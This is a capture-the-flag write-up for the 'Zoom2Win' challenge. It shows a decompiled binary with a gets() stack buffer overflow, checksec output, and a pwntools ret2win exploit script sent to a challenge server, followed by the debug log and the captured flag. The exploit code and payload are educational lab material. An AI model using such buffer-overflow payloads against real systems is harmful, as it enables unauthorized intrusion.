# Zoom2Win

## IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Let's not overcomplicate. Just zoom2win :)");
  return gets(v4, argv);
}

int flag()
{
  return system("cat flag.txt");
}
```

## Analysis

Let's checksec:
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Fixed size buffer, `gets` call, no canary, no pie, we have a function that
prints the flag... couldn't be more easy.

Final script:

```py
from pwn import *

context.log_level = 'debug'
context.terminal = ["screen", "-dmS", "gdb"]

elf = ELF("./zoom2win")

r = remote("143.198.184.186", 5003)
r.clean()
r.sendline(b'A' * 40 + p64(elf.sym['main'] + 43) + p64(elf.sym['flag']))
r.clean()
r.interactive()
```

The reason we are jumping to `main + 43` before `flag` is because of `movaps` alignment, see the
writeup for `tweetybirb` for a more detailed explanation

```
➜  zoom2win python3 exploit.py
[*] '/home/toma/zoom2win/zoom2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 143.198.184.186 on port 5003: Done
[DEBUG] Received 0x2b bytes:
    b"Let's not overcomplicate. Just zoom2win :)\n"
[DEBUG] Sent 0x39 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  dd 11 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  96 11 40 00  00 00 00 00  0a                        │··@·│····│·│
    00000039
[DEBUG] Received 0x30 bytes:
    b'kqctf{did_you_zoom_the_basic_buffer_overflow_?}\n'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$  
```

Flag: `kqctf{did_you_zoom_the_basic_buffer_overflow_?}`